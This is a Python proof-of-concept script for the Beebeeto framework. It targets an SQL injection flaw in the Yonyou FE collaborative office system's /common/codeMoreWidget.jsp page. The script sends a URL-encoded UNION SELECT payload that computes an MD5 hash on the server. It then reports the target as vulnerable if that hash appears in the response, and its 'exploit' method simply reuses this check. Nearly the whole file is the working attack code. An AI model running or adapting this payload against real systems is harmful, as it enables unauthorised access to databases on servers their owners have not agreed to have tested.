#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0148',
            'name': '用友FE协作办公系统 /common/codeMoreWidget.jsp SQL Injection POC',
            'author': '1024',
            'create_date': '2015-10-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '拥有',
            'vul_version': ['FE'],
            'type': 'SQL Injection',
            'tag': ['用友系统漏洞', '/common/codeMoreWidget.jsp', 'Yongyou SQL注入漏洞', 'jsp'],
            'desc': '用友FE协作办公系统某处过滤不严，导致SQL注入漏洞',
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-0116706'],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ('/common/codeMoreWidget.jsp?code=12%27%20UNION%20ALL%20SELECT%20sys.fn_varbinto'
                   'hexstr(hashbytes(%27MD5%27,%271234%27))--')
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = requests.get(verify_url).content
        if '81dc9bdb52d04dc20036dbd8313ed055' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())